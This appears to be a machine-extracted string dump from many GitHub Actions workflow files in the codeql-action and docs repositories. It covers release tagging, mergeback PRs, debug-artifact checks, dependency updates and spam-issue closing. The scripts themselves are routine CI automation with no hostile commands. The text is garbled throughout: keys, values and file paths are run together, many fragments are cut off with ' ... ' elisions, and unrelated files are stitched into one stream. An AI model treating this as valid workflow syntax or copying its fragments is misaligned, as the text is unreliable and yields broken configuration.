.github/codeql/other-config-properties.yml.github ... ies.ymlname: O ... pertiescode-sc ... -tests:name: C ... I tests/home/huawei/github-actions-security/.github/workflows/github_codeql-action__debug-artifacts-failure-safe.ymlPR Check - Debug artifacts after failureupload-artifactsstable-v2.20.3- stable-v2.20.3Upload debug artifacts after failure in analyzeUpload  ... analyzeDump GitHub eventcat "${GITHUB_EVENT_PATH}"cat "${ ... _PATH}"name: D ... b event^1.13.1go-version: ^1.13.1debug-artifact-namemy-debug-artifactsdebug-database-namemy-dbCODEQL_ACTION_EXTRA_OPTIONSCODEQL_ ... OPTIONS{ "database": { "finalize": ["--invalid-option"] } }'{ "dat ... "] } }'CODEQL_ ... "] } }'expect-errorexpect-error: true- name: ... b eventdownload-and-check-artifactsdownloa ... tifactsDownload and check debug artifacts after failure in analyzeDownloa ... analyzeDownload all artifactsCheck expected artifacts existCheck e ... s existLANGUAGES="cpp csharp go java javascript python"
for version in $VERSIONS; do
  echo "Artifacts from version $version:"
  pushd "./my-debug-artifacts-${version//./}"
  for language in $LANGUAGES; do
    echo "- Checking $language"
    if [[ ! -f "my-db-$language-partial.zip" ]] ; then
      echo "Missing a partial database bundle for $language"
      exit 1
    fi
    if [[ ! -d "log" ]] ; then
      echo "Missing database initialization logs"
      exit 1
    fi
    if [[ ! "$language" == "go" ]] && [[ ! -d "$language/log" ]] ; then
      echo "Missing logs for $language"
      exit 1
    fi
  done
  popd
done
GO111MODULE: autoname: C ... s existname: D ... analyzeupload-artifacts:/home/huawei/github-actions-security/.github/workflows/github_codeql-action__debug-artifacts-safe.ymlPR Check - Debug artifact uploadPR Chec ...  uploadUpload debug artifactsDownload and check debug artifactsVERSIONS="stable-v2.20.3 default linked nightly-latest"
LANGUAGES="cpp csharp go java javascript python"
for version in $VERSIONS; do
  pushd "./my-debug-artifacts-${version//./}"
  echo "Artifacts from version $version:"
  for language in $LANGUAGES; do
    echo "- Checking $language"
    if [[ ! -f "$language.sarif" ]] ; then
      echo "Missing a SARIF file for $language"
      exit 1
    fi
    if [[ ! -f "my-db-$language.zip" ]] ; then
      echo "Missing a database bundle for $language"
      exit 1
    fi
    if [[ ! -d "$language/log" ]] ; then
      echo "Missing logs for $language"
      exit 1
    fi
  done
  popd
done
name: P ...  upload/home/huawei/github-actions-security/.github/workflows/github_codeql-action__expected-queries-runs.ymlCheck queries that ranCheck q ... hat ranexpected-queriesExpected Queries TestsExpecte ... s Testsversion: linkedCheck Sarifjs/incomplete-hostname-regexp,js/path-injectionjs/inco ... jectionname: Check Sarifname: E ... s Testsexpected-queries:name: C ... hat ran/home/huawei/github-actions-security/.github/workflows/github_codeql-action__post-release-mergeback.ymlTag release and merge backTag rel ... ge backbaseBranchThe base branch to merge into'The ba ... e into'descrip ... e into'baseBranch:- releases/v*merge-backAutomationgithub.repository == 'github/codeql-action'github. ... action'BASE_BRANCH${{ github.event.inputs.baseBranch || 'main' }}"${{ gi ... in' }}"HEAD_BRANCH${{ github.head_ref || github.ref }}"${{ gi ... ref }}"BASE_BR ... in' }}"content ... commitsDump environmentname: D ... ronmentDump GitHub contextGITHUB_CONTEXT${{ toJson(github) }}'${{ to ... ub) }}'GITHUB_ ... ub) }}'echo "${GITHUB_CONTEXT}"echo "$ ... NTEXT}"name: D ... contextfetch-d ... commitsUpdate git configgit config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
git config --global user.name "github-actions[bot]"
name: U ...  configGet version and new branchGet ver ...  branchgetVersionVERSION="v$(jq '.version' -r 'package.json')"
echo "version=${VERSION}" >> $GITHUB_OUTPUT
short_sha="${GITHUB_SHA:0:8}"
NEW_BRANCH="mergeback/${VERSION}-to-${BASE_BRANCH}-${short_sha}"
echo "newBranch=${NEW_BRANCH}" >> $GITHUB_OUTPUT
LATEST_RELEASE_BRANCH=$(git branch -r | grep -E "origin/releases/v[0-9]+$" | sed 's/origin\///g' | sort -V | tail -1 | xargs)
echo "latest_release_branch=${LATEST_RELEASE_BRANCH}" >> $GITHUB_OUTPUT
name: G ...  branchDump branchesNEW_BRANCH${{ steps.getVersion.outputs.newBranch }}"${{ st ... nch }}"NEW_BRA ... nch }}"echo "BASE_BRANCH ${BASE_BRANCH}"
echo "HEAD_BRANCH ${HEAD_BRANCH}"
echo "NEW_BRANCH ${NEW_BRANCH}"
echo "LATEST_RELEASE_BRANCH ${LATEST_RELEASE_BRANCH}"
echo "GITHUB_REF ${GITHUB_REF}"
name: Dump branchesCreate mergeback branchCreate  ...  branchgit checkout -b "${NEW_BRANCH}"
Check for tag${{ steps.getVersion.outputs.version }}"${{ st ... ion }}"VERSION ... ion }}"set +e # don't fail on an errored command
git ls-remote --tags origin | grep "${VERSION}"
exists="$?"
if [ "${exists}" -eq 0 ]; then
  echo "Tag ${VERSION} exists. Not going to re-release."
  echo "exists=true" >> $GITHUB_OUTPUT
else
  echo "Tag ${VERSION} does not exist yet."
fi
name: Check for tagTag releasesteps.check.outputs.exists != 'true'VERSION ... sion }}# Create the `vx.y.z` tag
git tag --annotate "${VERSION}" --message "${VERSION}"
# Update the `vx` tag
major_version_tag=$(cut -d '.' -f1 <<< "${VERSION}")
# Use `--force` to overwrite the major version tag
git tag --annotate "${major_version_tag}" --message "${major_version_tag}" --force
# Push the tags, using:
# - `--atomic` to make sure we either update both tags or neither (an intermediate state,
#   e.g. where we update the vN.x.y tag on the remote but not the vN tag, could result in
#   unwanted Dependabot updates, e.g. from vN to vN.x.y)
# - `--force` since we're overwriting the `vN` tag
git push origin --atomic --force refs/tags/"${VERSION}" refs/tags/"${major_version_tag}"
name: Tag releasePrepare partial ChangelogPrepare ... angelogPARTIAL_CHANGELOG${{ runner.temp }}/partial_changelog.md"${{ ru ... log.md"PARTIAL ... log.md"python .github/workflows/script/prepare_changelog.py CHANGELOG.md "$VERSION" > $PARTIAL_CHANGELOG

echo "::group::Partial CHANGELOG"
cat $PARTIAL_CHANGELOG
echo "::endgroup::"
name: P ... angelog${{ steps.check.outputs.exists != 'true' && endsWith(github.ref_name, steps.getVersion.outputs.latest_release_branch) }}${{ ste ... nch) }}set -exu
pr_title="Mergeback ${VERSION} ${HEAD_BRANCH} into ${BASE_BRANCH}"
pr_body=$(cat << EOF
  This PR bumps the version number and updates the changelog after the ${VERSION} release.

  Please do the following:

  - [ ] Remove and re-add the "Update dependencies" label to the PR to trigger just this workflow.
  - [ ] Wait for the "Update dependencies" workflow to push a commit updating the dependencies.
  - [ ] Mark the PR as ready for review to trigger the full set of PR checks.
  - [ ] Approve and merge the PR. When merging the PR, make sure "Create a merge commit" is
        selected rather than "Squash and merge" or "Rebase and merge".
EOF
)

# Update the version number ready for the next release
npm version patch --no-git-tag-version

# Update the changelog, adding a new version heading directly above the most recent existing one
awk '!f && /##/{print "'"## [UNRELEASED]\n\nNo user facing changes.\n"'"; f=1}1' CHANGELOG.md > temp && mv temp CHANGELOG.md
git add .
git commit -m "Update changelog and version after ${VERSION}"

git push origin "${NEW_BRANCH}"

# PR checks won't be triggered on PRs created by Actions. Therefore mark the PR as draft
# so that a maintainer can take the PR out of draft, thereby triggering the PR checks.
gh pr create \
  --head "${NEW_BRANCH}" \
  --base "${BASE_BRANCH}" \
  --title "${pr_title}" \
  --label "Update dependencies" \
  --body "${pr_body}" \
  --assignee "${GITHUB_ACTOR}" \
  --draft
Generate tokenactions/create-github-app-token@v2.0.6actions ... @v2.0.6app-tokenapp-id${{ vars.AUTOMATION_APP_ID }}${{ var ... P_ID }}private-key${{ secrets.AUTOMATION_PRIVATE_KEY }}app-id: ... P_ID }}name: Generate tokenCreate the GitHub releaseCreate  ... release${{ steps.app-token.outputs.token }}# Do not mark this release as latest. The most recent CLI release must be marked as latest.
gh release create \
  "$VERSION" \
  --latest=false \
  --title "$VERSION" \
  --notes-file "$PARTIAL_CHANGELOG"
name: C ... releasemerge-back:name: T ... ge back/home/huawei/github-actions-security/.github/workflows/github_codeql-action__pr-checks.ymlPR Checkscheck-jsCheck JSnpm run-script lint-cinpm run ... lint-ciUpload sarifgithub/codeql-action/upload-sarif@v3github/ ... arif@v3eslint.sarifsarif_f ... t.sarifname: Upload sarifCheck generated JS.github/workflows/script/check-js.sh.github ... k-js.shname: C ... ated JSname: Check JScheck-node-modulesgithub.event_name != 'push' || github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/heads/releases/v')github. ... ses/v')Check modules up to dateCheck m ... to dateCheck node modules up to dateCheck n ... to date.github/workflows/script/check-node-modules.sh.github ... ules.shif: git ... ses/v')check-file-contentsCheck file contentsSet up Pythonname: Set up Pythonpython -m pip install --upgrade pip
# When updating this, update the autogenerated code header in `sync.py` too.
pip install ruamel.yaml==0.17.31
Verify PR checks up to dateVerify  ... to date.github/workflows/script/verify-pr-checks.sh.github ... ecks.shname: V ... to datenpm-testUnit Test[check- ... odules]npm test# Run any commands referenced in package.json using Bash, otherwise
# we won't be able to find them on Windows.
npm config set script-shell bash
npm test
name: npm testcheck-node-versionCheck Action Node versionsCheck A ... ersionsBASE_REF${{ github.base_ref }}${{ git ... _ref }}BASE_RE ... _ref }}head-versionVerify all Actions use the same Node versionNODE_VERSION=$(find . -name "action.yml" -exec yq -e '.runs.using' {} \; | grep node | sort | uniq)
echo "NODE_VERSION: ${NODE_VERSION}"
if [[ $(echo "$NODE_VERSION" | wc -l) -gt 1 ]]; then
  echo "::error::More than one node version used in 'action.yml' files."
  exit 1
fi
echo "node_version=${NODE_VERSION}" >> $GITHUB_OUTPUT
id: head-versioncheckout-baseBackport: Check out base ref'Backpo ... se ref'${{ startsWith(github.head_ref, 'backport-') }}${{ sta ... t-') }}${{ env.BASE_REF }}ref: ${ ... _REF }}id: checkout-baseBackport: Verify Node versions unchanged'Backpo ... hanged'steps.checkout-base.outcome == 'success'steps.c ... uccess'HEAD_VERSION${{ steps.head-version.outputs.node_version }}HEAD_VE ... sion }}BASE_VERSION=$(find . -name "action.yml" -exec yq -e '.runs.using' {} \; | grep node | sort | uniq)
echo "HEAD_VERSION: ${HEAD_VERSION}"
echo "BASE_VERSION: ${BASE_VERSION}"
if [[ "$BASE_VERSION" != "$HEAD_VERSION" ]]; then
  echo "::error::Cannot change the Node version of an Action in a backport PR."
  exit 1
fi
name: ' ... hanged'check-js:name: PR Checks/home/huawei/github-actions-security/.github/workflows/github_codeql-action__publish-immutable-action.ymlCheck release nameRELEASE_NAME${{ github.event.release.name }}RELEASE ... name }}echo "Release name: ${{ github.event.release.name }}"
if [[ $RELEASE_NAME == v* ]]; then
  echo "This is a CodeQL Action release. Create an Immutable Action"
  echo "is-action-release=true" >> $GITHUB_OUTPUT
else
  echo "This is a CodeQL Bundle release. Do not create an Immutable Action"
  echo "is-action-release=false" >> $GITHUB_OUTPUT
fi
name: C ... se namesteps.check.outputs.is-action-release == 'true'- name: ... se name/home/huawei/github-actions-security/.github/workflows/github_codeql-action__python312-windows.ymlTest that the workaround for python 3.12 on windows worksTest th ... s works0 0 * * 1'0 0 * * 1'cron: '0 0 * * 1'- cron: '0 0 * * 1'test-setup-python-scriptstest-se ... scriptspython-version: 3.12uses: a ... thon@v5version: default- uses: ... thon@v5env:test-se ... cripts:name: T ... s works/home/huawei/github-actions-security/.github/workflows/github_codeql-action__query-filters.ymlQuery filters testsquery-filtersQuery Filters Testscontent ... sitory.Check SARIF for default queries with Single include, Single excludeCheck S ... exclude./../action/.github/actions/query-filter-test./../ac ... er-testjs/zipslipjs/path-injection./.github/codeql/codeql-config-query-filters1.yml./.gith ... rs1.ymlname: C ... excludeCheck SARIF for query packs with Single include, Single excludejs/zipslip,javascript/example/empty-or-one-blockjs/zips ... e-block./.github/codeql/codeql-config-query-filters2.yml./.gith ... rs2.ymlCheck SARIF for query packs and local queries with Single include, Single excludejs/zipslip,javascript/example/empty-or-one-block,inrepo-javascript-querypack/show-ifsjs/zips ... how-ifsjs/path-injection,complex-python-querypack/show-ifs,complex-python-querypack/foo/bar/show-ifsjs/path ... how-ifs./.github/codeql/codeql-config-query-filters3.yml./.gith ... rs3.ymlname: Q ... s Testsquery-filters:name: Q ... s tests/home/huawei/github-actions-security/.github/workflows/github_codeql-action__rebuild.ymlRebuild Actionrebuildgithub.event.label.name == 'Rebuild'github. ... ebuild'content ...  commit${{ github.event.pull_request.head.ref }}ref: ${ ... .ref }}PR_NUMBER${{ github.event.pull_request.number }}gh pr edit --repo github/codeql-action "$PR_NUMBER" \
  --remove-label "Rebuild"
Merge in changes from base branchMerge i ...  branch${{ github.event.pull_request.base.ref }}BASE_BR ... .ref }}git fetch origin "$BASE_BRANCH"

# Allow merge conflicts in `lib`, since rebuilding should resolve them.
git merge "origin/$BASE_BRANCH" || echo "Merge conflicts detected"

# Check for merge conflicts outside of `lib`. Disable git diff's trailing whitespace check
# since `node_modules/@types/semver/README.md` fails it.
if git -c core.whitespace=-trailing-space diff --check | grep --invert-match '^lib/'; then
  echo "Merge conflicts detected outside of lib/ directory. Please resolve them manually."
  git -c core.whitespace=-trailing-space diff --check | grep --invert-match '^lib/' || true
  exit 1
fi
name: M ...  branchCompile TypeScriptnpm install
npm run lint -- --fix
npm run build
name: C ... eScriptGenerate workflowscd pr-checks
python -m pip install --upgrade pip
pip install ruamel.yaml==0.17.31
python3 sync.py
name: G ... rkflowsCheck for changes and pushCheck f ... nd pushBRANCH: ... .ref }}if [ ! -z "$(git status --porcelain)" ]; then
  git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
  git config --global user.name "github-actions[bot]"
  git add --all
  git commit -m "Rebuild"
  git push origin "HEAD:$BRANCH"
  echo "Pushed a commit to rebuild the Action." \
    "Please mark the PR as ready for review to trigger PR checks." |
    gh pr comment --body-file - --repo github/codeql-action "$PR_NUMBER"
  gh pr ready --undo --repo github/codeql-action "$PR_NUMBER"
fi
name: C ... nd pushname: Rebuild Actionrebuild:/home/huawei/github-actions-security/.github/workflows/github_codeql-action__test-codeql-bundle-all.ymlPR Check - CodeQL Bundle All'PR Che ... le All'test-codeql-bundle-alltest-co ... dle-allCodeQL Bundle All'CodeQL Bundle All'languag ... n,ruby test-co ... le-all:name: ' ... le All'/home/huawei/github-actions-security/.github/workflows/github_codeql-action__update-bundle.ymlUpdate default CodeQL bundleUpdate  ...  bundleupdate-bundlegithub.event.release.prerelease && startsWith(github.event.release.tag_name, 'codeql-bundle-')github. ... ndle-')echo "$GITHUB_CONTEXT"echo "$ ... ONTEXT"Update bundle./.github/actions/update-bundle./.gith ... -bundlename: Update bundlenpm run buildCommit and push changesCommit  ... changesRELEASE_TAG${{ github.event.release.tag_name }}"${{ gi ... ame }}"RELEASE ... ame }}"git checkout -b "update-bundle/$RELEASE_TAG"
git commit -am "Update default bundle to $RELEASE_TAG"
git push --set-upstream origin "update-bundle/$RELEASE_TAG"
Open pull requestcli_version=$(jq -r '.cliVersion' src/defaults.json)
pr_url=$(gh pr create \
  --title "Update default bundle to $cli_version" \
  --body "This pull request updates the default CodeQL bundle, as used with \`tools: linked\` and on GHES, to $cli_version." \
  --assignee "$GITHUB_ACTOR" \
  --draft \
)
echo "CLI_VERSION=$cli_version" | tee -a "$GITHUB_ENV"
echo "PR_URL=$pr_url" | tee -a "$GITHUB_ENV"
name: O ... requestCreate changelog noteCreate  ... og noteimport os
import re

# Get the PR number from the PR URL.
pr_number = os.environ['PR_URL'].split('/')[-1]
changelog_note = f"- Update default CodeQL bundle version to {os.environ['CLI_VERSION']}. [#{pr_number}]({os.environ['PR_URL']})"

# If the "[UNRELEASED]" section starts with "no user facing changes", remove that line.
# Use perl to avoid having to escape the newline character.

with open('CHANGELOG.md', 'r') as f:
    changelog = f.read()

changelog = changelog.replace('## [UNRELEASED]\n\nNo user facing changes.', '## [UNRELEASED]\n')

# Add the changelog note to the bottom of the "[UNRELEASED]" section.
changelog = re.sub(r'\n## (\d+\.\d+\.\d+)', f'{changelog_note}\n\n## \\1', changelog, count=1)

with open('CHANGELOG.md', 'w') as f:
    f.write(changelog)
name: C ... og notePush changelog notegit commit -am "Add changelog note"
git push
name: P ... og noteif: git ... ndle-')update-bundle:name: U ...  bundle/home/huawei/github-actions-security/.github/workflows/github_codeql-action__update-dependencies.ymlUpdate dependencies[opened ... abeled]types:  ... abeled]updatecontains(github.event.pull_request.labels.*.name, 'Update dependencies') && (github.event.pull_request.head.repo.full_name == 'github/codeql-action')contain ... ction')content ... denciesRemove PR labelREPOSITORY'${{ gi ... ory }}''${{ gi ... ber }}'gh api "repos/$REPOSITORY/issues/$PR_NUMBER/labels/Update%20dependencies" -X DELETE
name: R ... R labelPush updated dependenciesPush up ... dencies${{ github.head_ref }}'${{ gi ... ref }}'BRANCH: ... ref }}'git fetch origin "$BRANCH" --depth=1
git checkout "origin/$BRANCH"
.github/workflows/script/update-node-modules.sh update
if [ ! -z "$(git status --porcelain)" ]; then
  git config --global user.email "41898282+github-actions[bot]@users.noreply.github.com"
  git config --global user.name "github-actions[bot]"
  git add node_modules
  git commit -am "Update checked-in dependencies"
  git push origin "HEAD:$BRANCH"
  echo "Pushed a commit to update the checked-in dependencies." \
    "Please mark the PR as ready for review to trigger PR checks." |
    gh pr comment --body-file - --repo github/codeql-action "${{ github.event.pull_request.number }}"
  gh pr ready --undo --repo github/codeql-action "${{ github.event.pull_request.number }}"
fi
name: P ... denciesname: U ... denciesupdate:/home/huawei/github-actions-security/.github/workflows/github_codeql-action__update-release-branch.ymlUpdate release branchUpdate  ...  branch- releases/*${{ steps.versions.outputs.version }}major_version${{ steps.versions.outputs.major_version }}latest_tag${{ steps.versions.outputs.latest_tag }}${{ ste ... _tag }}backport_source_branchbackpor ... _branch${{ steps.branches.outputs.backport_source_branch }}${{ ste ... anch }}backport_target_branchesbackpor ... ranches${{ steps.branches.outputs.backport_target_branches }}${{ ste ... ches }}fetch-d ... f diffs./.github/actions/release-initialise./.gith ... tialiseuses: . ... tialiseGet version tagsVERSION="v$(jq '.version' -r 'package.json')"
echo "version=${VERSION}" >> $GITHUB_OUTPUT
MAJOR_VERSION=$(cut -d '.' -f1 <<< "${VERSION}")
echo "major_version=${MAJOR_VERSION}" >> $GITHUB_OUTPUT
LATEST_TAG=$(git tag --sort=-v:refname | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+' | head -1)
echo "latest_tag=${LATEST_TAG}" >> $GITHUB_OUTPUT
name: G ... on tagsDetermine older release branchesDetermi ... ranches./.github/actions/release-branches./.gith ... ranchesmajor_v ... sion }}id: branchesdebug loggingecho 'version: ${{ steps.versions.outputs.version }}'
echo 'major_version: ${{ steps.versions.outputs.major_version }}'
echo 'latest_tag: ${{ steps.versions.outputs.latest_tag }}'
echo 'backport_source_branch: ${{ steps.branches.outputs.backport_source_branch }}'
echo 'backport_target_branches: ${{ steps.branches.outputs.backport_target_branches }}'
name: debug logginggithub.event_name == 'workflow_dispatch'github. ... spatch'[prepare]REF_NAME${{ github.ref_name }}"${{ gi ... ory }}"MAJOR_VERSION${{ needs.prepare.outputs.major_version }}"${{ ne ... ion }}"LATEST_TAG${{ needs.prepare.outputs.latest_tag }}"${{ ne ... tag }}"REF_NAM ... ame }}"Ensure release branch existsEnsure  ...  existsecho "MAJOR_VERSION ${MAJOR_VERSION}"
RELEASE_BRANCH=releases/${MAJOR_VERSION}
if git checkout $RELEASE_BRANCH > /dev/null 2>&1; then
    echo "Branch $RELEASE_BRANCH already exists"
    echo ""
else
    echo "Creating $RELEASE_BRANCH branch"
    git checkout -b ${RELEASE_BRANCH} ${LATEST_TAG}
    git push --set-upstream origin ${RELEASE_BRANCH}
    git branch --show-current
    echo ""
fi
echo "Returning to branch: ${REF_NAME}"
git checkout ${REF_NAME}
name: E ...  existsUpdate current release branchecho SOURCE_BRANCH=${REF_NAME}
echo TARGET_BRANCH=releases/${MAJOR_VERSION}
python .github/update-release-branch.py \
  --github-token ${{ secrets.GITHUB_TOKEN }} \
  --repository-nwo ${{ github.repository }} \
  --source-branch '${{ env.REF_NAME }}' \
  --target-branch 'releases/${{ env.MAJOR_VERSION }}' \
  --is-primary-release \
  --conductor ${GITHUB_ACTOR}
name: U ...  branchtimeout-minutes: 45backport${{ (github.event_name == 'push') && needs.prepare.outputs.backport_target_branches != '[]' }}${{ (gi ... '[]' }}target_branch${{ fromJson(needs.prepare.outputs.backport_target_branches) }}${{ fro ... hes) }}target_ ... hes) }}SOURCE_BRANCH${{ needs.prepare.outputs.backport_source_branch }}${{ nee ... anch }}TARGET_BRANCH${{ matrix.target_branch }}${{ mat ... anch }}SOURCE_ ... anch }}Update older release branchecho SOURCE_BRANCH=${SOURCE_BRANCH}
echo TARGET_BRANCH=${TARGET_BRANCH}
python .github/update-release-branch.py \
  --github-token ${{ secrets.GITHUB_TOKEN }} \
  --repository-nwo ${{ github.repository }} \
  --source-branch ${SOURCE_BRANCH} \
  --target-branch ${TARGET_BRANCH} \
  --conductor ${GITHUB_ACTOR}
- name: ... e token/home/huawei/github-actions-security/.github/workflows/github_codeql-action__update-supported-enterprise-server-versions.ymlUpdate Supported Enterprise Server VersionsUpdate  ... ersionsupdate-supported-enterprise-server-versionsupdate- ... ersions"3.13"python- ...  "3.13"Checkout Enterprise ReleasesCheckou ... eleasesgithub/enterprise-releasesgithub/ ... eleases${{ secrets.ENTERPRISE_RELEASE_TOKEN }}${{ github.workspace }}/enterprise-releases/${{ git ... leases/reposit ... eleasesname: C ... eleasescd ./.github/workflows/update-supported-enterprise-server-versions/
python3 -m pip install pipenv
pipenv install
pipenv run ./update.py
rm --recursive "$ENTERPRISE_RELEASES_PATH"
npm run build
ENTERPRISE_RELEASES_PATHENTERPR ... ES_PATHENTERPR ... leases/name: U ... ersionsCommit changes and open PRCommit  ... open PRif [[ -z $(git status --porcelain) ]]; then
  echo "No changes to commit"
else
  git checkout -b update-supported-enterprise-server-versions
  git add .
  git commit --message "Update supported GitHub Enterprise Server versions"
  git push origin update-supported-enterprise-server-versions

  body="This PR updates the list of supported GitHub Enterprise Server versions, either because a new "
  body+="version is about to be feature frozen, or because an old release has been deprecated."
  body+=$'\n\n'
  body+="If an old release has been deprecated, please follow the instructions in CONTRIBUTING.md to "
  body+="deprecate the corresponding version of CodeQL."

  gh pr create --draft \
    --title "Update supported GitHub Enterprise Server versions" \
    --body "$body"
fi
name: C ... open PR- name: Setup Pythonupdate- ... rsions:/home/huawei/github-actions-security/.github/workflows/github_docs__all-documents.ymlAll documents scriptsrc/content-render/scripts/all-documents/**'src/co ... nts/**'package*.json'package*.json'.github/workflows/all-documents.yml.github ... nts.yml- 'src/ ... nts/**'all-documents-scriptgithub.repository == 'github/docs-internal'github. ... ternal'actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11actions ... 36bae11./.github/actions/node-npm-setup./.gith ... m-setupuses: . ... m-setupRun all-documents scriptRun all ...  scriptNODE_ENVproductionNODE_ENV: productionecho "Help..."
npm run all-documents -- --help

echo ""
echo "Storing in a file (English only)"
npm run all-documents -- -o all-documents.json -l en

echo ""
echo "Look at the first 50 lines of the file..."
cat all-documents.json | jq | head -n 50

# We're essentially expecting it to not crash and fail.
name: R ...  script- name: ... ut repoif: git ... ternal'all-doc ... script:name: A ...  script/home/huawei/github-actions-security/.github/workflows/github_docs__article-api-docs.ymlCheck article-api docs'Check  ... i docs'src/article-api/middleware/article.ts'src/ar ... cle.ts'src/article-api/middleware/pagelist.ts'src/ar ... ist.ts'.github/workflows/article-api-docs.yml.github ... ocs.yml- 'src/ ... cle.ts'check-content-linter-rules-docscheck-c ... es-docs${{ fromJSON('["ubuntu-latest", "ubuntu-20.04-xl"]')[github.repository == 'github/docs-internal'] }}${{ fro ... al'] }}github.repository == 'github/docs-internal' || github.repository == 'github/docs'github. ... b/docs'Check that src/article-api/README.md is up-to-dateCheck t ... to-datenpm run generate-article-api-docsnpm run ... pi-docsname: C ... to-dateFail if it isn't up-to-dateFail if ... to-dateif [ -n "$(git status --porcelain)" ]; then
  git status
  git diff

  # Some whitespace for the sake of the message below
  echo ""
  echo ""

  echo "src/article-api/README.md is out of date."
  echo "Please run 'npm run generate-article-api-docs' and commit the changes."
  exit 1;
fi
name: F ... to-dateruns-on ... al'] }}check-c ... s-docs:name: ' ... i docs'/home/huawei/github-actions-security/.github/workflows/github_docs__auto-close-dependencies.ymlAuto Close Open Source Dependency UpdatesAuto Cl ... UpdatesGemfile*'Gemfile*'Dockerfile'Dockerfile'.github/workflows/**'.githu ... ows/**'- 'package*.json'pull_request_reviewsubmitted- editedclose-external${{
  github.repository == 'github/docs' &&
  github.event.pull_request.number &&
  github.event.pull_request.base.ref == 'main' &&
  github.event.pull_request.user.login == 'dependabot[bot]' &&
  github.event.pull_request.state == 'open'
}}>-Close pull requestgh pr close "$PR_URL"
name: C ... requestComment on the pull requestComment ... requestgh pr comment "$PR_URL" --body "This dependency update will be handled internally by our engineering team."
Lock conversationsactions/github-script@e69ef5462fd455e02edcaf4dd7708eda96b9eda0actions ... 6b9eda0PR_NUMB ... mber }}try {
  await github.rest.issues.lock({
    ...context.repo,
    issue_number: parseInt(process.env.PR_NUMBER, 10),
    lock_reason: 'resolved'
  })
  console.log('Locked the pull request to prevent spam!')
} catch (error) {
  console.error(`Failed to lock the pull request. Error: ${error}`)
  throw error
}
name: L ... sationsif: >-close-external:name: A ... Updates/home/huawei/github-actions-security/.github/workflows/github_docs__check-broken-links-github-github.ymlCheck Broken Docs Links in github/githubCheck B ... /github20 16 * * 1'20 16 * * 1'cron: ' ... :20 PST- cron: ... :20 PSTcheck_github_github_linkscheck_g ... b_links${{ secrets.DOCS_BOT_PAT_BASE }}${{ sec ... BASE }}REPORT_AUTHORdocs-botREPORT_LABELgithub github broken link reportgithub  ...  reportREPORT_REPOSITORYgithub/docs-contentGITHUB_ ... BASE }}persist ... 'false'./.github/actions/get-docs-early-access./.gith ... -accesstoken:  ... BASE }}uses: . ... -accessBuild servername: Build serverStart server in the backgroundStart s ... kgroundPORT4000ENABLED_LANGUAGESen
npm run start &
sleep 5
curl --retry-connrefused --retry 3 -I http://localhost:4000/
name: S ... kgroundRun broken github/github link checkRun bro ... k checknpm run check-github-github-links -- broken_github_github_links.md
name: R ... k checkGet title for issue${{ hashFiles('broken_github_github_links.md') != '' }}${{ has ... = '' }}echo "title=$(head -1 broken_github_github_links.md)" >> $GITHUB_OUTPUTecho "t ... _OUTPUTname: G ... r issueCreate issue from fileCreate  ... om filegithub-github-broken-link-reportgithub- ... -reportpeter-evans/create-issue-from-file@24452a72d85239eacf1468b0f1982a9f3fec4c94peter-e ... fec4c94${{ env.GITHUB_TOKEN }}${{ env ... OKEN }}${{ steps.check.outputs.title }}${{ ste ... itle }}content-filepath./broken_github_github_links.md./broke ... inks.md${{ env.REPORT_REPOSITORY }}${{ env ... TORY }}${{ env.REPORT_LABEL }}${{ env ... ABEL }}name: C ... om file./.github/actions/slack-alert./.gith ... k-alert${{ failure() && github.event_name != 'workflow_dispatch' }}${{ fai ... tch' }}slack_channel_id${{ secrets.DOCS_ALERTS_SLACK_CHANNEL_ID }}slack_token${{ secrets.SLACK_DOCS_BOT_TOKEN }}slack_c ... L_ID }}uses: . ... k-alertcheck_g ... _links:name: C ... /github/home/huawei/github-actions-security/.github/workflows/github_docs__check-for-spammy-issues.ymlCheck for Spammy IssuesCheck f ...  Issuesspammy-title-checkRemove issues with spammy titlesRemove  ...  titlesgithub.repository == 'github/docs'
const issue = context.payload.issue
const owner = 'github'
const repo = 'docs'

const titleWordCount = issue.title.trim().split(' ').length
const titleWordCountMin = 3

try {
  await github.rest.teams.getMembershipForUserInOrg({
    org: 'github',
    team_slug: 'employees',
    username: context.payload.sender.login,
  });

  // Do not perform this workflow with GitHub employees. This return
  // statement only gets hit if the user is a GitHub employee
  return
} catch (err) {
  // An error will be thrown if the user is not a GitHub employee
  // If a user is not a GitHub employee, we should check to see if title has at least the minimum required number of words in it and if it does, we can exit the workflow

  if (titleWordCount >= titleWordCountMin) {
    return
  }
}

//
// Assuming the user is not a GitHub employee and the issue title
// does not contain the minimum number of words required, proceed.
//

// Close the issue and add the invalid label
await github.rest.issues.update({
  owner: owner,
  repo: repo,
  issue_number: issue.number,
  labels: ['invalid'],
  state: 'closed'
});

// Comment on the issue
await github.rest.issues.createComment({
  owner: owner,
  repo: repo,
  issue_number: issue.number,
  body: `This issue may have been opened accidentally. I'm going to close it now, but feel free to open a new issue with a more descriptive title!`
});

// Add the issue to the Done column on the triage board
try {
  await github.rest.projects.createCard({
    column_id: 11167427,
    content_id: context.payload.issue.id,
    content_type: "Issue"
  });
} catch (error) {
  console.log(error);
}
github- ... BASE }}uses: a ... 6b9eda0- uses: ... 6b9eda0name: R ...  titlesspammy-title-check:name: C ...  Issues/home/huawei/github-actions-security/.github/workflows/github_docs__close-bad-repo-sync-prs.ymlClose bad repo-sync PRsClose b ... ync PRsclose-invalid-repo-sync-prclose-i ... sync-pr${{ github.repository == 'github/docs' && github.event.pull_request.base.ref == 'main' && github.event.pull_request.head.ref == 'repo-sync' }}${{ git ... ync' }}Close if invalid repo-sync PR authorClose i ...  authorClose pull request if unwantedClose p ... nwantedconst { owner, repo } = context.repo
const prCreator = context.actor
const prNumber = context.issue.number

try {
  await github.rest.teams.getMembershipForUserInOrg({
    org: 'github',
    team_slug: 'employees',
    username: prCreator
  })

  // If the PR creator is a GitHub employee, stop now
  console.log("PR creator is a GitHub employee")
  return
} catch (err) {
  // An error will be thrown if the user is not a GitHub employee.
  // That said, we still want to proceed anyway!
}

// Close the PR and add the invalid label
await github.rest.issues.update({
  owner,
  repo,
  issue_number: prNumber,
  labels: ['invalid'],
  state: 'closed'
})

// Comment on the PR
await github.rest.issues.createComment({
  owner,
  repo,
  issue_number: prNumber,
  body: "Please leave this `repo-sync` branch to the robots!\n\nI'm going to close this pull request now, but feel free to open a new issue in the repository!"
})
